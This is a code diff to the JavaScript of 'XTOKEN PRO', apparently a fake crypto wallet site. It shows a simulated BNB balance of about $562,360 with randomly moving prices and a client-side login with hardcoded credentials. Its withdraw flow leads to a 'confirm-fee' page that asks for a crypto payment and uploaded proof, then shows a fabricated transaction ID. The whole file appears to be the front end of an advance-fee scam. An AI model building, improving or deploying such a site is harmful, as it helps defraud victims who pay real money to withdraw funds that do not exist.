@@ -1,6 +1,6 @@
 /**
  * XTOKEN PRO - Shared JavaScript
- * Ultra Modern Crypto Wallet 2026
+ * Fixed for iPhone Safari & GitHub Pages
  */
 
 // State Management
@@ -21,6 +21,37 @@ const state = {
   ]
 };
 
+// Safe Storage wrapper (works in Private Browsing)
+const safeStorage = {
+  set: function(key, value) {
+    try {
+      localStorage.setItem(key, value);
+      return true;
+    } catch (e) {
+      // Fallback to memory if localStorage fails (Private Browsing)
+      this.memory = this.memory || {};
+      this.memory[key] = value;
+      return true;
+    }
+  },
+  get: function(key) {
+    try {
+      return localStorage.getItem(key);
+    } catch (e) {
+      this.memory = this.memory || {};
+      return this.memory[key] || null;
+    }
+  },
+  remove: function(key) {
+    try {
+      localStorage.removeItem(key);
+    } catch (e) {
+      this.memory = this.memory || {};
+      delete this.memory[key];
+    }
+  }
+};
+
 // Initialize
 document.addEventListener('DOMContentLoaded', () => {
   initParticles();
@@ -37,7 +68,7 @@ function initParticles() {
   
   const ctx = canvas.getContext('2d');
   let particles = [];
-  const particleCount = 50;
+  const particleCount = 30; // Reduced for mobile performance
   
   function resize() {
     canvas.width = window.innerWidth;
@@ -87,25 +118,6 @@ function initParticles() {
       p.update();
       p.draw();
     });
-    
-    // Connect nearby particles
-    particles.forEach((p1, i) => {
-      particles.slice(i + 1).forEach(p2 => {
-        const dx = p1.x - p2.x;
-        const dy = p1.y - p2.y;
-        const distance = Math.sqrt(dx * dx + dy * dy);
-        
-        if (distance < 100) {
-          ctx.beginPath();
-          ctx.strokeStyle = `rgba(139, 92, 246, ${0.1 * (1 - distance / 100)})`;
-          ctx.lineWidth = 0.5;
-          ctx.moveTo(p1.x, p1.y);
-          ctx.lineTo(p2.x, p2.y);
-          ctx.stroke();
-        }
-      });
-    });
-    
     requestAnimationFrame(animate);
   }
   animate();
@@ -113,50 +125,44 @@ function initParticles() {
 
 // Price Simulation
 function initPriceSimulation() {
-  // Load saved price
-  const saved = localStorage.getItem('xtoken_state');
+  const saved = safeStorage.get('xtoken_state');
   if (saved) {
-    const parsed = JSON.parse(saved);
-    state.bnbPrice = parsed.bnbPrice || 680;
-    state.bnbBalance = parsed.bnbBalance || 827.00000001;
-    state.usdBalance = parsed.usdBalance || 562360;
+    try {
+      const parsed = JSON.parse(saved);
+      state.bnbPrice = parsed.bnbPrice || 680;
+      state.bnbBalance = parsed.bnbBalance || 827.00000001;
+      state.usdBalance = parsed.usdBalance || 562360;
+    } catch(e) {
+      console.log('Using default values');
+    }
   }
   
-  // Update displays immediately
   updatePriceDisplay();
   
-  // Simulate price changes every 30-60 seconds
   setInterval(() => {
-    const changePercent = (Math.random() - 0.5) * 0.03; // ±1.5%
+    const changePercent = (Math.random() - 0.5) * 0.03;
     const oldPrice = state.bnbPrice;
     state.bnbPrice = Math.max(670, Math.min(685, state.bnbPrice * (1 + changePercent)));
     state.bnbPrice = parseFloat(state.bnbPrice.toFixed(2));
-    
-    // Recalculate USD balance
     state.usdBalance = state.bnbPrice * state.bnbBalance;
-    
     saveState();
     updatePriceDisplay(oldPrice);
-  }, Math.random() * 30000 + 30000); // 30-60s
+  }, Math.random() * 30000 + 30000);
 }
 
 function updatePriceDisplay(oldPrice = null) {
-  // Update all price elements
   document.querySelectorAll('[data-bnb-price]').forEach(el => {
-    el.textContent = `$${state.bnbPrice.toFixed(2)}`;
-    
+    el.textContent = '$' + state.bnbPrice.toFixed(2);
     if (oldPrice !== null) {
       const diff = state.bnbPrice - oldPrice;
       el.classList.remove('price-up', 'price-down');
       el.classList.add(diff >= 0 ? 'price-up' : 'price-down');
-      
       setTimeout(() => {
         el.classList.remove('price-up', 'price-down');
       }, 2000);
     }
   });
   
-  // Update balance displays
   document.querySelectorAll('[data-usd-balance]').forEach(el => {
     const hidden = el.classList.contains('hidden-balance');
     el.textContent = hidden ? '****' : formatCurrency(state.usdBalance);
@@ -167,11 +173,10 @@ function updatePriceDisplay(oldPrice = null) {
     el.textContent = hidden ? '****' : state.bnbBalance.toFixed(8);
   });
   
-  // Update conversion displays
   document.querySelectorAll('[data-conversion]').forEach(el => {
     const amount = parseFloat(el.dataset.amount) || 0;
     const converted = (amount / state.bnbPrice).toFixed(8);
-    el.textContent = `${converted} BNB`;
+    el.textContent = converted + ' BNB';
   });
 }
 
@@ -185,7 +190,7 @@ function formatCurrency(amount) {
 }
 
 function saveState() {
-  localStorage.setItem('xtoken_state', JSON.stringify({
+  safeStorage.set('xtoken_state', JSON.stringify({
     bnbPrice: state.bnbPrice,
     bnbBalance: state.bnbBalance,
     usdBalance: state.usdBalance,
@@ -194,7 +199,7 @@ function saveState() {
 }
 
 function initLocalStorage() {
-  if (!localStorage.getItem('xtoken_state')) {
+  if (!safeStorage.get('xtoken_state')) {
     saveState();
   }
 }
@@ -203,6 +208,8 @@ function initLocalStorage() {
 function initRippleEffect() {
   document.querySelectorAll('.btn, .action-btn, .asset-card, .withdraw-option').forEach(btn => {
     btn.addEventListener('click', function(e) {
+      if (this.classList.contains('no-ripple')) return;
+      
       const rect = this.getBoundingClientRect();
       const ripple = document.createElement('span');
       const size = Math.max(rect.width, rect.height);
@@ -224,7 +231,7 @@ function initRippleEffect() {
 function initPageSpecific() {
   const path = window.location.pathname;
   
-  if (path.includes('index') || path === '/' || path === '') {
+  if (path.includes('index') || path === '/' || path.endsWith('xtoken-wallet/') || path === '') {
     initLogin();
   } else if (path.includes('dashboard')) {
     initDashboard();
@@ -237,20 +244,34 @@ function initPageSpecific() {
   }
 }
 
-// Login
+// Login - FIXED FOR GITHUB PAGES
 function initLogin() {
   const form = document.getElementById('login-form');
   if (!form) return;
   
-  form.addEventListener('submit', (e) => {
+  form.addEventListener('submit', function(e) {
     e.preventDefault();
+    e.stopPropagation();
+    
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
     const errorMsg = document.getElementById('error-msg');
     
     if (username === 'DonteG77' && password === 'XTokenDG7') {
-      localStorage.setItem('xtoken_auth', 'true');
-      window.location.href = 'dashboard.html';
+      safeStorage.set('xtoken_auth', 'true');
+      
+      // Multiple redirect methods for compatibility
+      try {
+        window.location.href = 'dashboard.html';
+      } catch(err) {
+        try {
+          window.location.replace('dashboard.html');
+        } catch(err2) {
+          document.location.href = 'dashboard.html';
+        }
+      }
+      
+      return false;
     } else {
       errorMsg.textContent = 'Invalid credentials. Please try again.';
       errorMsg.classList.remove('hidden');
@@ -262,13 +283,11 @@ function initLogin() {
 
 // Dashboard
 function initDashboard() {
-  // Check auth
-  if (!localStorage.getItem('xtoken_auth')) {
+  if (!safeStorage.get('xtoken_auth')) {
     window.location.href = 'index.html';
     return;
   }
   
-  // Eye toggle
   const eyeToggle = document.getElementById('eye-toggle');
   if (eyeToggle) {
     eyeToggle.addEventListener('click', () => {
@@ -279,7 +298,6 @@ function initDashboard() {
     });
   }
   
-  // Update displays
   updatePriceDisplay();
 }
 
@@ -291,10 +309,10 @@ function initWithdrawForm() {
   const typeFields = {
     'cashapp': 'cashapp-field',
     'paypal': 'paypal-field',
-    'bank': 'bank-fields'
+    'bank': 'bank-fields',
+    'wallet': 'wallet-field'
   };
   
-  // Show relevant fields
   Object.keys(typeFields).forEach(key => {
     const field = document.getElementById(typeFields[key]);
     if (field) {
@@ -302,7 +320,6 @@ function initWithdrawForm() {
     }
   });
   
-  // Amount input handling
   const amountInput = document.getElementById('amount');
   const conversionDisplay = document.getElementById('conversion-display');
   
@@ -310,11 +327,10 @@ function initWithdrawForm() {
     amountInput.addEventListener('input', (e) => {
       const usd = parseFloat(e.target.value) || 0;
       const bnb = (usd / state.bnbPrice).toFixed(8);
-      conversionDisplay.innerHTML = `≈ <span class="highlight">${bnb} BNB</span> at current rate`;
+      conversionDisplay.innerHTML = '≈ <span class="highlight">' + bnb + ' BNB</span> at current rate';
     });
   }
   
-  // Form submission
   const form = document.getElementById('withdraw-form');
   if (form) {
     form.addEventListener('submit', (e) => {
@@ -327,7 +343,7 @@ function initWithdrawForm() {
       });
       params.append('type', type);
       
-      window.location.href = `confirm-fee.html?${params.toString()}`;
+      window.location.href = 'confirm-fee.html?' + params.toString();
     });
   }
 }
@@ -338,14 +354,13 @@ function initConfirmFee() {
   const amount = urlParams.get('amount') || '0';
   const type = urlParams.get('type') || 'wallet';
   
-  // Fill review details
   document.querySelectorAll('[data-review-amount]').forEach(el => {
     el.textContent = formatCurrency(parseFloat(amount));
   });
   
   document.querySelectorAll('[data-review-bnb]').forEach(el => {
     const bnb = (parseFloat(amount) / state.bnbPrice).toFixed(8);
-    el.textContent = `${bnb} BNB`;
+    el.textContent = bnb + ' BNB';
   });
   
   const typeNames = {
@@ -359,15 +374,8 @@ function initConfirmFee() {
     el.textContent = typeNames[type] || type;
   });
   
-  // Coin selection
   const coinSelect = document.getElementById('coin-select');
   const addressBoxes = document.querySelectorAll('.address-box');
-  const addresses = {
-    'btc': 'bc1qxy2kgdygtv2q4yrf2z3pkkfhtx0w0lhj3j4x3j',
-    'usdt': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-    'eth': '0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe',
-    'bnb': '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c'
-  };
   
   if (coinSelect) {
     coinSelect.addEventListener('change', (e) => {
@@ -381,39 +389,56 @@ function initConfirmFee() {
     });
   }
   
-  // Copy buttons
   document.querySelectorAll('.copy-btn').forEach(btn => {
     btn.addEventListener('click', function() {
       const text = this.dataset.copy;
-      navigator.clipboard.writeText(text).then(() => {
-        this.classList.add('copied');
+      if (navigator.clipboard) {
+        navigator.clipboard.writeText(text).then(() => {
+          this.classList.add('copied');
+          this.innerHTML = '✓ Copied';
+          setTimeout(() => {
+            this.classList.remove('copied');
+            this.innerHTML = '📋 Copy';
+          }, 2000);
+        });
+      } else {
+        // Fallback for older browsers
+        const textarea = document.createElement('textarea');
+        textarea.value = text;
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textarea);
         this.innerHTML = '✓ Copied';
         setTimeout(() => {
-          this.classList.remove('copied');
           this.innerHTML = '📋 Copy';
         }, 2000);
-      });
+      }
     });
   });
   
-  // File upload
   const uploadZone = document.getElementById('upload-zone');
   const fileInput = document.getElementById('proof-file');
   const proceedBtn = document.getElementById('proceed-btn');
   
   if (uploadZone && fileInput) {
     uploadZone.addEventListener('click', () => fileInput.click());
+    
     uploadZone.addEventListener('dragover', (e) => {
       e.preventDefault();
       uploadZone.classList.add('dragover');
     });
+    
     uploadZone.addEventListener('dragleave', () => {
       uploadZone.classList.remove('dragover');
     });
+    
     uploadZone.addEventListener('drop', (e) => {
       e.preventDefault();
       uploadZone.classList.remove('dragover');
-      handleFile(e.dataTransfer.files[0]);
+      if (e.dataTransfer.files[0]) {
+        handleFile(e.dataTransfer.files[0]);
+      }
     });
     
     fileInput.addEventListener('change', (e) => {
@@ -428,11 +453,7 @@ function initConfirmFee() {
     
     const reader = new FileReader();
     reader.onload = (e) => {
-      uploadZone.innerHTML = `
-        <img src="${e.target.result}" class="upload-preview" alt="Preview">
-        <p class="upload-text">✓ File uploaded</p>
-        <p class="upload-hint">${file.name}</p>
-      `;
+      uploadZone.innerHTML = '<img src="' + e.target.result + '" class="upload-preview" alt="Preview"><p class="upload-text">✓ File uploaded</p><p class="upload-hint">' + file.name + '</p>';
       uploadZone.classList.add('has-file');
       if (proceedBtn) {
         proceedBtn.disabled = false;
@@ -442,20 +463,17 @@ function initConfirmFee() {
     reader.readAsDataURL(file);
   }
   
-  // Form submission
   const form = document.getElementById('confirm-form');
   if (form) {
     form.addEventListener('submit', (e) => {
       e.preventDefault();
       
-      // Deduct balance
       const withdrawAmount = parseFloat(urlParams.get('amount')) || 0;
       const bnbAmount = withdrawAmount / state.bnbPrice;
       state.bnbBalance -= bnbAmount;
       state.usdBalance = state.bnbBalance * state.bnbPrice;
       saveState();
       
-      // Save transaction details
       const txData = {
         amount: withdrawAmount,
         bnbAmount: bnbAmount.toFixed(8),
@@ -464,7 +482,7 @@ function initConfirmFee() {
         date: new Date().toISOString(),
         txId: '0x' + Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('')
       };
-      localStorage.setItem('xtoken_last_tx', JSON.stringify(txData));
+      safeStorage.set('xtoken_last_tx', JSON.stringify(txData));
       
       window.location.href = 'success.html';
     });
@@ -473,11 +491,10 @@ function initConfirmFee() {
 
 // Success Page
 function initSuccess() {
-  const txData = JSON.parse(localStorage.getItem('xtoken_last_tx') || '{}');
+  const txData = JSON.parse(safeStorage.get('xtoken_last_tx') || '{}');
   
-  // Fill receipt
   document.querySelectorAll('[data-tx-id]').forEach(el => {
-    el.textContent = txData.txId || '0x...';
+    el.textContent = (txData.txId || '0x...').substring(0, 20) + '...';
   });
   
   document.querySelectorAll('[data-tx-amount]').forEach(el => {
@@ -485,7 +502,7 @@ function initSuccess() {
   });
   
   document.querySelectorAll('[data-tx-bnb]').forEach(el => {
-    el.textContent = `${txData.bnbAmount || '0.00000000'} BNB`;
+    el.textContent = (txData.bnbAmount || '0.00000000') + ' BNB';
   });
   
   document.querySelectorAll('[data-tx-destination]').forEach(el => {
@@ -496,7 +513,6 @@ function initSuccess() {
     el.textContent = new Date(txData.date || new Date()).toLocaleString();
   });
   
-  // Confetti
   initConfetti();
 }
 
@@ -511,7 +527,7 @@ function initConfetti() {
   
   const colors = ['#8b5cf6', '#3b82f6', '#10b981', '#f59e0b', '#ef4444', '#06b6d4'];
   const confetti = [];
-  const particleCount = 150;
+  const particleCount = 100;
   
   for (let i = 0; i < particleCount; i++) {
     confetti.push({
@@ -526,14 +542,13 @@ function initConfetti() {
     });
   }
   
-  let animationId;
   let frameCount = 0;
   
   function animate() {
     ctx.clearRect(0, 0, canvas.width, canvas.height);
     frameCount++;
     
-    confetti.forEach((p, i) => {
+    confetti.forEach((p) => {
       p.y += p.speedY;
       p.x += p.speedX;
       p.rotation += p.rotationSpeed;
@@ -551,28 +566,23 @@ function initConfetti() {
       }
     });
     
-    if (frameCount < 300) { // Stop after ~5 seconds
-      animationId = requestAnimationFrame(animate);
+    if (frameCount < 300) {
+      requestAnimationFrame(animate);
     }
   }
   
   animate();
-  
-  window.addEventListener('resize', () => {
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-  });
 }
 
 // Logout
 function logout() {
-  localStorage.removeItem('xtoken_auth');
+  safeStorage.remove('xtoken_auth');
   window.location.href = 'index.html';
 }
 
-// Export for global access
+// Expose to global
 window.xtoken = {
-  state,
-  formatCurrency,
-  logout
+  state: state,
+  formatCurrency: formatCurrency,
+  logout: logout
 };
